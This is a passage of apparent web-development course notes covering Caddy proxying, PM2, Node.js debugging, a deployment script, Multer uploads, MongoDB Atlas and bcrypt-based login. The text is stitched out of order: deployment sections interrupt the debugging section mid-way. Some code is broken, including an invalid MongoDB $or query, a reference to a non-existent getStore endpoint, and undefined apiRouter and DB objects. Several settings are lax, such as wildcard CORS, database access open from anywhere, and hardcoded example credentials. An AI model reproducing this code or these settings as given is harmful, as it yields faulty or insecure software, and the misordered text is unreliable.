  reverse_proxy _ localhost:5000
  header Cache-Control none
  header -server
  header Access-Control-Allow-Origin *
}

This tells Caddy that when it gets a request for tacos.cs260.click it will act as a proxy for those requests and pass them on to the web service that is listening on the same machine (localhost), on port 5000. The other settings tell Caddy to return headers that disable caching, hide the fact that Caddy is the server (no reason to tell hackers anything about your server), and to allow any other origin server to make endpoint requests to this subdomain (basically disabling CORS). Depending on what your web service does you may want different settings.
Restart Caddy to cause it to load the new settings.
sudo service caddy restart

Now Caddy will attempt to proxy the requests, but there is no web service listening on port 5000 and so you will get an error from Caddy if you make a request to tacos.cs260.click.
Create the web service
Copy the ~/services/startup directory to a directory that represents the purpose of your service. For example:
cp -r ~/services/startup ~/services/tacos

If you list the directory you should see an index.js file that is the main JavaScript file for your web service. It has the code to listen on the designated network port and respond to requests. The following is the JavaScript that causes the web service to listen on a port that is provided as an argument to the command line.
const port = process.argv.length > 2 ? process.argv[2] : 3000;
app.listen(port, () => {
  console.log(`Listening on port ${port}`);
});

There is also a directory named public that has static HTML/CSS/JavaScript files that your web service will respond with when requested. The index.js file enables this with the following code:
app.use(express.static('public'));

You can start up the web service, listening on port 5000, using Node as follows.
node index.js 5000

You can now access your web service through the browser, or curl.
curl https://tacos.cs260.click

Caddy will receive the request and map the subdomain name, tacos.cs260.click, to a request for http://localhost:5000. Your web service is listening on port 5000 and so it receives the request and responds.
Stop your web service by pressing CTRL-C in the SSH console that you used to start the service. Now your browser request for your subdomain should return an error again.
Configure PM2 to host the web service
The problem with running your web service from the console with node index.js 5000, is that as soon as you close your SSH session it will terminate all processes you started in that session, including your web service. Instead you need something that is always running in the background to run your web service. This is where daemons come into play. The daemon we use to do this is called PM2.
From your SSH console session run:
pm2 ls

This will list the web services that you already have registered with PM2. To run your newly created web service under PM2, make sure you are in your service directory, and run the command similar to the following, with the service name and port substituted to your desired values:
cd ~/services/tacos
pm2 start index.js -n tacos -- 5000
pm2 save

If you run pm2 ls again you should see your web service listed. You can now access your subdomain in the browser and see the proper response. PM2 will keep running your service even after you exit your SSH session.

Debugging Node.js
🔑 Required reading: Debugging a Node.js application
📖 Deeper dive reading: Node.js debugging in VS Code
Previously your JavaScript debugging was done by running the Live Server VS Code extension and using the browser's debugging tools as it executed in the browser. Now that you are writing JavaScript that runs using Node.js, you need a way to launch and debug your code that runs outside of the browser. One great way to do that is to use the debugging tools built into VS Code. To debug JavaScript in VS Code you first need some JavaScript to debug. Open up VS Code and create a new file named main.js and paste the following code into the file.
let x = 1 + 1;

console.log(x);

function double(x) {
  return x * 2;
}

x = double(x);

console.log(x);

You can now debug main.js in VS Code by executing the Start Debugging command by pressing F5. The first time you run this, VS Code will ask you what debugger you want to use. Select Node.js.

The code will execute and the debug console window will automatically open to show you the debugger output where you can see the results of the two console.log statements found in the code.

You can pause execution of the code by setting a breakpoint. Move your cursor over to the far left side of the editor window. As you hover on the left side of the line numbers you will see a red dot appear. Click on the dot to set the breakpoint.

Now start the debugger again by pressing F5. The code will start running, but pause on the line with the breakpoint. You can then see the values of variables by looking at the variable window on the left, or by hovering your mouse over the variable you would like to inspect.
Development and production environments
When working on a commercial web application, it is critical to separate where you develop your application, from where the production release of your application is made publicly available. Often times there are more environments than this, such as staging, internal testing, and external testing environments. If your company is seeking third party security certification (such as SOC2 compliance) they will require that these environments are strictly separated from each other. A developer will not have access to the production environment in order to prevent a developer from nefariously manipulating an entire company asset. Instead, automated integration processes, called continuous integration (CI) processes, checkout the application code, lint it, build it, test it, stage it, test it more, and then finally, if everything checks out, deploy the application to the production environment, and notify the different departments in the company of the release.

For our work, you will use and manage both your development environment (your personal computer) and your production environment (your AWS server). However, you should never consider your production environment as a place to develop, or experiment with, your application. You may shell into the production environment to configure your server or to debug a production problem, but the deployment of your application should happen using an automated CI process. For our CI process, we will use a very simple console shell script.

Automating your deployment
The advantage of using an automated deployment process is that it is reproducible. You don't accidentally delete a file, or misconfigure something with an stray keystroke. Also, having a automated script encourages you to iterate quickly because it is so much easier to deploy your code. You can add a small feature, deploy it out to production, and get feedback within minutes from your users.
Our deployment scripts change with each new technology that we have to deploy. Initially, they just copy up a directory of HTML files, but soon they include the ability to modify the configuration of your web server, run transpiler tools, and bundle your code into a deployable package.
You run a deployment script from a console window in your development environment with a command like the following.
./deployService.sh -k ~/prod.pem -h yourdomain.click -s simon

The -k parameter provides the credential file necessary to access your production environment. The -h parameter is the domain name of your production environment. The -s parameter represents the name of the application you are deploying (either simon or startup).
This will make more sense as we gradually build up our technologies but we can discuss our simon-service deployment script as an example of what they will do. You can view the entire file here, but we will explain each step below. It isn't critical that you deeply understand everything in the script, but the more you do understand the easier it will be for you to track down and fix problems when they arise.
The first part of the script simply parses the command line parameters so that we can pass in the production environment's security key (or PEM key), the hostname of your domain, and the name of the service you are deploying.
while getopts k:h:s: flag
do
    case "${flag}" in
        k) key=${OPTARG};;
        h) hostname=${OPTARG};;
        s) service=${OPTARG};;
    esac
done

if [[ -z "$key" || -z "$hostname" || -z "$service" ]]; then
    printf "\nMissing required parameter.\n"
    printf "  syntax: deployService.sh -k <pem key file> -h <hostname> -s <service>\n\n"
    exit 1
fi

printf "\n----> Deploying $service to $hostname with $key\n"

Next the script copies all of the applicable source files into a distribution directory (dist) in preparation for copying that directory to your production server.
# Step 1
printf "\n----> Build the distribution package\n"
rm -rf dist
mkdir dist
cp -r application dist
cp *.js dist
cp package* dist

The target directory on your production environment is deleted so that the new one can replace it. This is done by executing commands remotely using the secure shell program (ssh).
# Step 2
printf "\n----> Clearing out previous distribution on the target\n"
ssh -i $key ubuntu@$hostname << ENDSSH
rm -rf services/${service}
mkdir -p services/${service}
ENDSSH

The distribution directory is then copied to the production environment using the secure copy program (scp).
# Step 3
printf "\n----> Copy the distribution package to the target\n"
scp -r -i $key dist/* ubuntu@$hostname:services/$service

We then use ssh again to execute some commands on the production environment. This installs the node packages with npm install and restarts the service daemon (PM2) that runs our web application in the production environment.
# Step 4
printf "\n----> Deploy the service on the target\n"
ssh -i $key ubuntu@$hostname << ENDSSH
cd services/${service}
npm install
pm2 restart ${service}
ENDSSH

Finally we clean up our development environment by deleting the distribution package.
# Step 5
printf "\n----> Removing local copy of the distribution package\n"
rm -rf dist

Can you imagine if you had to do all of that by hand every time? You would dread deploying and would most likely make several time consuming mistakes during the process.
A deployment script exists for each of the Simon projects and you can use them, as is, for your startup application as long as you are doing similar types of deployment actions.
If you want to learn more about shell scripting you can read this tutorial. Shell scripting is a powerful tool for automating common development tasks and is well worth adding to your bucket of skills.


You can continue execution of the code by pressing F10 to step to the next line, F11 to step into a function call, or F5 to continue running from the current line. When the last line of code executes the debugger will automatically exit and you will need to press F5 to start it running again. You can stop debugging at any time by pressing SHIFT-F5.
Experiment with this simple file until you are comfortable running the debugger, setting breakpoints, and inspecting variables.
Debugging a Node.js web service
In order to debug a web service running under Node.js we first need to write our code. Replace the code in your main.js file with the following.
const express = require('express');
const app = express();

app.get('/*', (req, res) => {
  res.send({ url: req.originalUrl });
});

const port = 8080;
app.listen(port, function () {
  console.log(`Listening on port ${port}`);
});

Switch to your console application and run npm init -y and npm install express from your code directory so that we can use the Express package to write a simple web service.
Now we are ready to debug again. Set a breakpoint on the getStore endpoint callback (line 5) and the app.listen call (line 9). Start debugging by pressing F5. The debugger should stop on the listen call where you can inspect the app variable. Press F5 again to continue running. Now open up your browser and set the location to localhost:8080. This should hit the breakpoint on the endpoint. Take some time to inspect the req object. You should be able to see what the HTTP method is, what parameters are provided, and what the path currently is. Press F5 to continue.
Your browser should display the JSON object, containing the URL, that you returned from your endpoint. Now change the URL in the browser to include a path and some query parameters. Something like http://localhost:8080/fish/taco?order=2. Requesting that URL should cause your breakpoint to hit again where you can see the URL changes reflected in the req object.
Now, instead of pressing F5 to continue, press F11 to step into the res.send function. This will take you out of your code and into the Express code that handles sending a response. Because you installed the Express package using NPM, all of Express's source code is sitting in the node_modules directory. You can also set breakpoints there, examine variables, and step into functions. Debugging into popular packages is a great way to learn how to code by seeing how really good programmers do things. Take some time to walk around Holowaychuk's code and see if you can understand what it is doing.

Nodemon
Once you start writing complex web applications you will find yourself making changes in the middle of debugging sessions and you would like to have node restart automatically and update the browser as the changes are saved. This seems like a simple thing, but over the course of hundreds of changes, every second you can save really starts to add up.
The Nodemon package is basically a wrapper around node that watches for files in the project directory to change. When it detects that you saved something it will automatically restart node.
If you would like to experiment with this then take the following steps. First install Nodemon globally so that you can use it to debug all of your projects.
npm install -g nodemon

Then, because VS Code does not know how to launch Nodemon automatically, you need create a VS Code launch configuration. In VS Code press CTRL-SHIFT-P (on Windows) or ⌘-SHIFT-P (on Mac) and type the command Debug: Add configuration. This will then ask you what type of configuration you would like to create. Type Node.js and select the Node.js: Nodemon setup option. In the launch configuration file that it creates, change the program from app.js to main.js (or whatever the main JavaScript file is for your application) and save the configuration file.
Now when you press F5 to start debugging it will run Nodemon instead of Node.js, and your changes will automatically update your application when you save.

Uploading files
Web applications often need to upload one or more files from the frontend application running in the browser to the backend service. We can accomplish this by using the HTML input element of type file on the frontend, and the Multer NPM package on the backend.

Frontend Code
The following frontend code registers and event handler for when the selected file changes and only accepts files of type .png, .jpeg, or .jpg. We also create an img placeholder element that will display the uploaded image once it has been stored on the server.
<html lang="en">
  <body>
    <h1>Upload an image</h1>
    <input
      type="file"
      id="fileInput"
      name="file"
      accept=".png, .jpeg, .jpg"
      onchange="uploadFile(this)"
    />
    <div>
      <img style="padding: 2em 0" id="upload" />
    </div>
    <script defer src="frontend.js"></script>
  </body>
</html>

The frontend JavaScript handles the uploading of the file to the server and then uses the filename returned from the server to set the src attribute of the image element in the DOM. If an error happens then an alert is displayed to the user.
async function uploadFile(fileInput) {
  const file = fileInput.files[0];
  if (file) {
    const formData = new FormData();
    formData.append('file', file);

    const response = await fetch('/upload', {
      method: 'POST',
      body: formData,
    });

    const data = await response.json();
    if (response.ok) {
      document.querySelector('#upload').src = `/file/${data.file}`;
    } else {
      alert(data.message);
    }
  }
}

Backend code
In order to build storage support into our server, we first install the Multer NPM package to our project. There are other NPM packages that we can chose from, but Multer is commonly used. From your project directory, run the following console command.
npm install multer

Multer handles reading the file from the HTTP request, enforcing the size limit of the upload, and storing the file in the uploads directory. Additionally our service code does the following:
Handles requests for static files so that we can serve up our frontend code.
Handles errors such as when the 64k file limit is violated.
Provides a GET endpoint to serve up a file from the uploads directory.
const express = require('express');
const multer = require('multer');

const app = express();

app.use(express.static('public'));

const upload = multer({
  storage: multer.diskStorage({
    destination: 'uploads/',
    filename: (req, file, cb) => {
      const filetype = file.originalname.split('.').pop();
      const id = Math.round(Math.random() * 1e9);
      const filename = `${id}.${filetype}`;
      cb(null, filename);
    },
  }),
  limits: { fileSize: 64000 },
});

app.post('/upload', upload.single('file'), (req, res) => {
  if (req.file) {
    res.send({
      message: 'Uploaded succeeded',
      file: req.file.filename,
    });
  } else {
    res.status(400).send({ message: 'Upload failed' });
  }
});

app.get('/file/:filename', (req, res) => {
  res.sendFile(__dirname + `/uploads/${req.params.filename}`);
});

app.use((err, req, res, next) => {
  if (err instanceof multer.MulterError) {
    res.status(413).send({ message: err.message });
  } else {
    res.status(500).send({ message: err.message });
  }
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});

Where you store your files
You should take serious thought about where you store your files. Putting files on your server is not a very good production level solution for the following reasons.
You only have so much available space. Your server only has 8 GB by default. Once you use up all your space then your server will fail to operate correctly and you may need to rebuild your server.
In a production system, servers are transient and are often replaced as new versions are released, or capacity requirements change. That means you will lose any state that you store on your server.
The server storage is not usually backed up. If the server fails for any reason, you will lose your customer's data.
If you have multiple application servers then you can't assume that the server you uploaded the data to is going to be the one you request a download from.
Instead you want to use a dedicated storage service that has durability guarantees, is not tied to your compute capacity, and can be accessed by multiple application servers.

Storage services
Web applications commonly need to store files associated with the application or the users of the application. This includes files such as images, user uploads, documents, and movies. Files usually have an ID, some metadata, and the bytes representing the file itself. These can be stored using a database service, but usually that is overkill and a simpler solution will be cheaper.
It might be tempting to store files directly on your server. This is usually a bad idea for several reasons.
Your server has limited drive space. If you server runs out of drive space your entire application will fail.
You should consider your server as being ephemeral, or temporary. It can be thrown away and replaced by a copy at any time. If you start storing files on the server, then your server has state that cannot be easily replaced.
You need backup copies of your application and user files. If you only have one copy of your files on your server, then they will disappear when your server disappears, and you must always assume that your server will disappear.
Instead you want to use a storage service that is specifically designed to support production storage and delivery of files.
AWS S3
There are many such solutions out there, but one of the most popular ones is AWS S3. S3 provides the following advantages:
It has unlimited capacity
You only pay for the storage that you use
It is optimized for global access
It keeps multiple redundant copies of every file
You can version the files
It is performant
It supports metadata tags
You can make your files publicly available directly from S3
You can keep your files private and only accessible to your application
In this course we will not be using any storage services for the Simon project. If, however, you want to use S3 as the storage service for your Startup application, then you need to learn how to use the AWS SDK. You can find detailed information about using AWS S3 with Node.js on the AWS website. Generally, the steps you need to take include:
Creating a S3 bucket to store your data in.
Getting credentials so that your application can access the bucket.
Using the credentials in your application.
Using the SDK to write, list, read, and delete files from the bucket.
⚠ Make sure that you do not include your credentials in your code. If you check your credentials into your GitHub repository they will immediately be stolen and used by hackers to take over your AWS account. This may result in significant monetary damage to you.

Data services
Web applications commonly need to store application and user data persistently. The data can be many things, but it is usually a representation of complex interrelated objects. This includes things like a user profile, organizational structure, game play information, usage history, billing information, peer relationship, library catalog, and so forth.

Historically, SQL databases have served as the general purpose data service solution, but starting around 2010, specialty data services that better support document, graph, JSON, time, sequence, and key-value pair data began to take significant roles in applications from major companies. These data services are often called NoSQL solutions because they do not use the general purpose relational database paradigms popularized by SQL databases. However, they all have very different underlying data structures, strengths, and weaknesses. That means that you should not simply split all of the possible data services into two narrowly defined boxes, SQL and NoSQL, when you are considering the right data service for your application.
Here is a list of some of the popular data services that are available.
Service
Specialty
MySQL
Relational queries
Redis
Memory cached objects
ElasticSearch
Ranked free text
MongoDB
JSON objects
DynamoDB
Key value pairs
Neo4J
Graph based data
InfluxDB
Time series data

MongoDB

For the projects in this course that require data services, we will use MongoDB. Mongo increases developer productivity by using JSON objects as its core data model. This makes it easy to have an application that uses JSON from the top to the bottom of the technology stack. A mongo database is made up of one or more collections that each contain JSON documents. You can think of a collection as a large array of JavaScript objects, each with a unique ID. The following is a sample of a collection of houses that are for rent.
[
  {
    _id: '62300f5316f7f58839c811de',
    name: 'Lovely Loft',
    summary: 'A charming loft in Paris',
    beds: 1,
    last_review: {
      $date: '2022-03-15T04:06:17.766Z',
    },
    price: 3000,
  },
  {
    _id: '623010b97f1fed0a2df311f8',
    name: 'Infinite Views',
    summary: 'Modern home with infinite views from the infinity pool',
    property_type: 'House',
    beds: 5,
    price: 250,
  },
];

Unlike relational databases that require a rigid table definition where each column must be strictly typed and defined beforehand, Mongo has no strict schema requirements. Each document in the collection usually follows a similar schema, but each document may have specialized fields that are present, and common fields that are missing. This allows the schema of a collection to morph organically as the data model of the application evolves. To add a new field to a Mongo collection you just insert the field into the documents as desired. If the field is not present, or has a different type in some documents, then the document simply doesn't match the query criteria when the field is referenced.
The query syntax for Mongo also follow a JavaScript-inspired flavor. Consider the following queries on the houses for rent collection that was shown above.
// find all houses
db.house.find();

// find houses with two or more bedrooms
db.house.find({ beds: { $gte: 2 } });

// find houses that are available with less than three beds
db.house.find({ status: 'available', beds: { $lt: 3 } });

// find houses with either less than three beds or less than $1000 a night
db.house.find({ $or: [(beds: { $lt: 3 }), (price: { $lt: 1000 })] });

// find houses with the text 'modern' or 'beach' in the summary
db.house.find({ summary: /(modern|beach)/i });

Using MongoDB in your application
📖 Deeper dive reading: MongoDB tutorial
The first step to using Mongo in your application is to install the mongodb package using NPM.
➜ npm install mongodb

With that done, you then use the MongoClient object to make a client connection to the database server. This requires a username, password, and the hostname of the database server.
const { MongoClient } = require('mongodb');

const userName = 'holowaychuk';
const password = 'express';
const hostname = 'mongodb.com';

const url = `mongodb+srv://${userName}:${password}@${hostname}`;

const client = new MongoClient(url);

With the client connection you can then get a database object and from that a collection object. The collection object allows you to insert, and query for, documents. You do not have to do anything special to insert a JavaScript object as a Mongo document. You just call the insertOne function on the collection object and pass it the JavaScript object. When you insert a document, if the database or collection does not exist, Mongo will automatically create them for you. When the document is inserted into the collection it will automatically be assigned a unique ID.
const collection = client.db('rental').collection('house');

const house = {
  name: 'Beachfront views',
  summary: 'From your bedroom to the beach, no shoes required',
  property_type: 'Condo',
  beds: 1,
};
await collection.insertOne(house);

To query for documents you use the find function on the collection object. Note that the find function is asynchronous and so we use the await keyword to wait for the promise to resolve before we write them out to the console.
const cursor = collection.find();
const rentals = await cursor.toArray();
rentals.forEach((i) => console.log(i));

If you do not supply any parameters to the find function then it will return all documents in the collection. In this case we only get back the single document that we previously inserted. Notice that the automatically generated ID is returned with the document.
Output
[
  {
    _id: new ObjectId('639a96398f8de594e198fc13'),
    name: 'Beachfront views',
    summary: 'From your bedroom to the beach, no shoes required',
    property_type: 'Condo',
    beds: 1,
  },
];

You can provide a query and options to the find function. In the example below we query for a property_type of Condo that has less than two bedrooms. We also specify the options to sort by descending price, and limit our results to the first 10 documents.
const query = { property_type: 'Condo', beds: { $lt: 2 } };

const options = {
  sort: { price: -1 },
  limit: 10,
};

const cursor = collection.find(query, options);
const rentals = await cursor.toArray();
rentals.forEach((i) => console.log(i));

The query matches the document that we previously inserted and so we get the same result as before.
There is a lot more functionality that MongoDB provides, but this is enough to get you started. If you are interested you can explore the tutorials on their website.
Managed services
Historically each application development team would have developers that managed the data service. Those developers would acquire hardware, install the database software, monitor the memory, cpu, and disk space, control the data schema, and handle migrations and upgrades. Much of this work has now moved to services that are hosted and managed by a 3rd party. This relieves the development team from much of the day-to-day maintenance. The team can instead focus more on the application and less on the infrastructure. With a managed data service you simply supply the data and the service grows, or shrinks, to support the desired capacity and performance criteria.
MongoDB Atlas
All of the major cloud providers offer multiple data services. For this class we will use the data service provided by MongoDB called Atlas. No credit card or payment is required to set up and use Atlas, as long as you stick to the shared cluster environment.
MongoDB Atlas sign up
⚠ This video tutorial will step you through the process of creating your account and setting up your database. You really want to watch this video. Note that some of the Atlas website interface may be slightly different, but the basic concepts should all be there in some shape or form. The main steps you need to take are:
Create your account.
Create a database cluster.
Create your root database user credentials. Remember these for later use.
⚠ Set network access to your database to be available from anywhere.

Copy the connection string and use the information in your code.
Save the connection and credential information in your production and development environments as instructed above.
You can always find the connection string to your Atlas cluster by pressing the Connect button from your Database > DataServices view.

Keeping your keys out of your code
You need to protect your credentials for connecting to your Mongo database. One common mistake is to check them into your code and then post it to a public GitHub repository. Instead you can load your credentials when the application executes. One common way to do that is to have a JSON configuration file that contains the credentials that you dynamically load into the JavaScript that makes the database connection. You then use the configuration file in your development environment and deploy it to your production environment, but you never commit it to GitHub.
In order to accomplish this do the following:
Create a file named dbConfig.json in the same directory as the database JavaScript (e.g. database.js) that you use to make database requests.
Insert your Mongo DB credentials into the dbConfig.json file in JSON format using the following example:
{
  "hostname": "cs260.abcdefg.mongodb.net",
  "userName": "myMongoUserName",
  "password": "toomanysecrets"
}


Import the dbConfig.json content into your database.js file using a Node.js require statement and use the data that it represents to create the connection URL.
const config = require('./dbConfig.json');
const url = `mongodb+srv://${config.userName}:${config.password}@${config.hostname}`;


⚠ Make sure you include dbConfig.json in your .gitignore file so that it does not get pushed up to GitHub.
Testing the connection on startup
It is nice to know that your connection string is correct before your application attempts to access any data. We can do that when the application starts by making an asynchronous request to ping the database. If that fails then either the connection string is incorrect, the credentials are invalid, or the network is not working. The following is an example of testing the connection.
const config = require('./dbConfig.json');

const url = `mongodb+srv://${config.userName}:${config.password}@${config.hostname}`;
const client = new MongoClient(url);
const db = client.db('rental');

(async function testConnection() {
  await client.connect();
  await db.command({ ping: 1 });
})().catch((ex) => {
  console.log(`Unable to connect to database with ${url} because ${ex.message}`);
  process.exit(1);
});

If your server is not starting, then check your logs for this exception being thrown.
Using Mongo from your code
With that all done, you should be good to use Atlas from both your development and production environments. You can test that things are working correctly with the following example.
const { MongoClient } = require('mongodb');
const config = require('./dbConfig.json');

async function main() {
  // Connect to the database cluster
  const url = `mongodb+srv://${config.userName}:${config.password}@${config.hostname}`;
  const client = new MongoClient(url);
  const db = client.db('rental');
  const collection = db.collection('house');

  // Test that you can connect to the database
  (async function testConnection() {
    await client.connect();
    await db.command({ ping: 1 });
  })().catch((ex) => {
    console.log(`Unable to connect to database with ${url} because ${ex.message}`);
    process.exit(1);
  });

  // Insert a document
  const house = {
    name: 'Beachfront views',
    summary: 'From your bedroom to the beach, no shoes required',
    property_type: 'Condo',
    beds: 1,
  };
  await collection.insertOne(house);

  // Query the documents
  const query = { property_type: 'Condo', beds: { $lt: 2 } };
  const options = {
    sort: { score: -1 },
    limit: 10,
  };

  const cursor = collection.find(query, options);
  const rentals = await cursor.toArray();
  rentals.forEach((i) => console.log(i));
}

main().catch(console.error);

To execute the above example, do the following:
Create a directory called mongoTest
Save the above content to a file named index.js
Create a file named dbConfig.json that contains your database credentials
Run npm init -y
Run npm install mongodb
Run node index.js.
This should output something like the following if everything is working correctly.
{
_id: new ObjectId("639b51b74ef1e953b884ca5b"),
name: 'Beachfront views',
summary: 'From your bedroom to the beach, no shoes required',
property_type: 'Condo',
beds: 1
}

☑ Assignment
First, set up your MongoDB Atlas database service. Then use the instructions above. Run the example program for testing that you have things set up correctly.
When you are done, submit the hostname for your Atlas database cluster to the Canvas assignment.
Here is an example hostname:
cs260.xiu1cqz.mongodb.net

Authorization services
If your application is going to remember a user's data then it will need a way to uniquely associate the data with a particular credential. That usually means that you authenticate a user by asking for information, such as an email address and password. You then remember, for some period of time, that the user has authenticated by storing an authentication token on the user's device. Often that token is stored in a cookie that is passed back to your web service on each request. The service can now associate data that the user supplies with a unique identifier that corresponds to their authorization token.

Determining what a user is authorized to do in your application is also important. For example, you might have different roles in your application such as Administrators, Editors, and Customers. Once you have the ability to authenticate a user and store information about that user, you can also store the authorization for the user. A simple application might have a single field that represents the role of the user. The service code would then use that role to allow, limit, or prevent what a service endpoint does. A complex web application will usually have very powerful authorization representation that controls the user's access to every part of the application. For example, an Editor role might have authorization only to work on content that they created or were invited to.

As you might imagine, authentication and authorization can become very complex, very quickly. It is also a primary target for a hacker. If they can bypass the authentication or escalate what they are authorized to do, then they can gain control of your application. Additionally, constantly forcing users to authenticate in a secure way causes users to not want to use an application. This creates opposing priorities: keep the system secure or make it easy to use.
In an attempt to remove the complexity of authentication and authorization from your application, many service providers and package developers have created solutions that you can use. Assuming that you are using a trusted, well-tested service this is an attractive option because it removes the cost of building, testing, and managing that critical infrastructure yourself.
Authorization services often use standard protocols for authenticating and authorizing. These include standards such as OAuth, SAML, and OIDC. Additionally, they usually support concepts like Single Sign On (SSO) and Federated Login. Single sign on allows a user to use the same credentials for multiple web applications. For example, you can log in to GitHub using your Google credentials. Federated login allows a user to log in once, and then the authentication token is reused to automatically log the user in to multiple websites. For example, logging in to Gmail allows you to also use Google Docs and YouTube without logging in again.
For this course we will implement our own authentication using a simple email/password design. Knowing how to implement a simple authentication design will help you appreciate what authentication services provide. If you want to experiment with different authorization services you might consider AWS Cognito, or Google Firebase.

Account creation and login
The first step towards supporting authentication in your web application is providing a way for users to uniquely identify themselves. This usually requires two service endpoints. One to initially create an authentication credential, and a second to authenticate, or login, on future visits. Once a user is authenticated we can control access to other endpoints. For example, web services often have a getMe endpoint that gives information about the currently authenticated user. We will implement this endpoint to demonstrate that authentication is actually working correctly.
Endpoint design
Using HTTP we can map out the design of each of our endpoints.
Create authentication endpoint
This takes an email and password and returns a cookie containing the authentication token and user ID. If the email already exists it returns a 409 (conflict) status code.
POST /auth/create HTTP/2
Content-Type: application/json

{
  "email":"marta@id.com",
  "password":"toomanysecrets"
}

HTTP/2 200 OK
Content-Type: application/json
Set-Cookie: auth=tokenHere

{
  "id":"337"
}

Login authentication endpoint
This takes an email and password and returns a cookie containing the authentication token and user ID. If the email does not exist or the password is bad it returns a 401 (unauthorized) status code.
POST /auth/login HTTP/2
Content-Type: application/json

{
  "email":"marta@id.com",
  "password":"toomanysecrets"
}

HTTP/2 200 OK
Content-Type: application/json
Set-Cookie: auth=tokenHere

{
  "id":"337"
}


GetMe endpoint
This uses the authentication token stored in the cookie to look up and return information about the authenticated user. If the token or user do not exist it returns a 401 (unauthorized) status code.
GET /user/me HTTP/2
Cookie: auth=tokenHere

HTTP/2 200 OK
Content-Type: application/json

{
  "email":"marta@id.com"
}


Web service
With our service endpoints designed, we can now build our web service using Express.
const express = require('express');
const app = express();

app.post('/auth/create', async (req, res) => {
  res.send({ id: 'user@id.com' });
});

app.post('/auth/login', async (req, res) => {
  res.send({ id: 'user@id.com' });
});

const port = 8080;
app.listen(port, function () {
  console.log(`Listening on port ${port}`);
});

Follow these steps, and then add in the code from the sections that follow. There is a copy of the final version of the example at the end of this instruction. If you get lost, or things are not working as expected, refer to the final version.
Create a directory called authTest that we will work in.
Save the above content to a file named main.js. This is our starting web service.
Run npm init -y to initialize the project to work with node.js.
Run npm install express cookie-parser mongodb uuid bcrypt to install all of the packages we are going to use.
Run node main.js or press F5 in VS Code to start up the web service.
You can now open a console window and use curl to try out one of the endpoints.
curl -X POST localhost:8080/auth/create
{"id":"user@id.com"}


Handling requests
With our basic service created, we can now implement the create authentication endpoint. The first step is to read the credentials from the body of the HTTP request. Since the body is designed to contain JSON we need to tell Express that it should parse HTTP requests, with a content type of application/json, automatically into a JavaScript object. We do this by using the express.json middleware. We can then read the email and password directly out of the req.body object. We can test that this is working by temporarily including them in the response.
app.use(express.json());

app.post('/auth/create', (req, res) => {
  res.send({
    id: 'user@id.com',
    email: req.body.email,
    password: req.body.password,
  });
});

curl -X POST localhost:8080/auth/create -H 'Content-Type:application/json' -d '{"email":"marta@id.com", "password":"toomanysecrets"}'

{"id":"user@id.com","email":"marta@id.com","password":"toomanysecrets"}

Now that we have proven that we can parse the request bodies correctly, we can change the code to add a check to see if we already have a user with that email address. If we do, then we immediately return a 409 (conflict) status code. Otherwise we create a new user and return the user ID.
app.post('/auth/create', async (req, res) => {
  if (await getUser(req.body.email)) {
    res.status(409).send({ msg: 'Existing user' });
  } else {
    const user = await createUser(req.body.email, req.body.password);
    res.send({
      id: user._id,
    });
  }
});

Using the database
We want to persistently store our users in Mongo and so we need to set up our code to connect to and use the database. This code is explained in the instruction on data services if you want to review what it is doing.
const { MongoClient } = require('mongodb');

const userName = 'holowaychuk';
const password = 'express';
const hostname = 'mongodb.com';

const url = `mongodb+srv://${userName}:${password}@${hostname}`;

const client = new MongoClient(url);

With a Mongo collection object we can implement the getUser and createUser functions.
function getUser(email) {
  return collection.findOne({ email: email });
}

async function createUser(email, password) {
  const user = {
    email: email,
    password: password,
    token: 'xxx',
  };
  return collection.insertOne(user);
}

But, we are missing a couple of things. We need a real authentication token, and we cannot simply store a clear text password in our database.
Generating authentication tokens
To generate a reasonable authentication token we use the uuid package. UUID stands for Universally Unique Identifier, and it does a really good job creating a hard to guess, random, unique ID.
const uuid = require('uuid');

token: uuid.v4();

Securing passwords
Next we need to securely store our passwords. Failing to do so is a major security concern. If, and it has happened to many major companies, a hacker is able to access the database, they will have the passwords for all of your users. This may not seem like a big deal if your application is not very valuable, but users often reuse passwords. That means you will also provide the hacker with the means to attack the user on many other websites.
So instead of storing the password directly, we want to cryptographically hash the password so that we never store the actual password. When we want to validate a password during login, we can hash the login password and compare it to our stored hash of the password.
To hash our passwords we will use the bcrypt package. This creates a very secure one-way hash of the password. If you are interested in understanding how bcrypt works, it is definitely worth the time.
const bcrypt = require('bcrypt');

async function createUser(email, password) {
  // Hash the password before we insert it into the database
  const passwordHash = await bcrypt.hash(password, 10);

  const user = {
    email: email,
    password: passwordHash,
    token: uuid.v4(),
  };
  await collection.insertOne(user);

  return user;
}

Passing authentication tokens
We now need to pass our generated authentication token to the browser when the login endpoint is called, and get it back on subsequent requests. To do this we use HTTP cookies. The cookie-parser package provides middleware for cookies and so we will leverage that.
We import the cookieParser object and then tell our app to use it. When a user is successfully created, or logs in, we set the cookie header. Since we are storing an authentication token in the cookie, we want to make it as secure as possible, and so we use the httpOnly, secure, and sameSite options.
httpOnly tells the browser to not allow JavaScript running on the browser to read the cookie.
secure requires HTTPS to be used when sending the cookie back to the server.
sameSite will only return the cookie to the domain that generated it.
const cookieParser = require('cookie-parser');

// Use the cookie parser middleware
app.use(cookieParser());

apiRouter.post('/auth/create', async (req, res) => {
  if (await DB.getUser(req.body.email)) {
    res.status(409).send({ msg: 'Existing user' });
  } else {
    const user = await DB.createUser(req.body.email, req.body.password);

    // Set the cookie
    setAuthCookie(res, user.token);

    res.send({
      id: user._id,
    });
  }
});

function setAuthCookie(res, authToken) {
  res.cookie('token', authToken, {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
  });
}

Login endpoint
The login authorization endpoint needs to get the hashed password from the database, compare it to the provided password using bcrypt.compare, and if successful set the authentication token in the cookie. If the password does not match, or there is no user with the given email, the endpoint returns status 401 (unauthorized).
app.post('/auth/login', async (req, res) => {
  const user = await getUser(req.body.email);
  if (user) {
    if (await bcrypt.compare(req.body.password, user.password)) {
      setAuthCookie(res, user.token);
      res.send({ id: user._id });
      return;
    }
  }
  res.status(401).send({ msg: 'Unauthorized' });
});

GetMe endpoint
With everything in place to create credentials and login using the credentials, we can now implement the getMe endpoint to demonstrate that it all actually works. To implement this we get the user object from the database by querying on the authentication token. If there is not an authentication token, or there is no user with that token, we return status 401 (unauthorized).
app.get('/user/me', async (req, res) => {
  authToken = req.cookies['token'];
  const user = await collection.findOne({ token: authToken });
  if (user) {
    res.send({ email: user.email });
    return;
  }
  res.status(401).send({ msg: 'Unauthorized' });
});

Final code
Here is the full example code.
const { MongoClient } = require('mongodb');
const uuid = require('uuid');
const bcrypt = require('bcrypt');
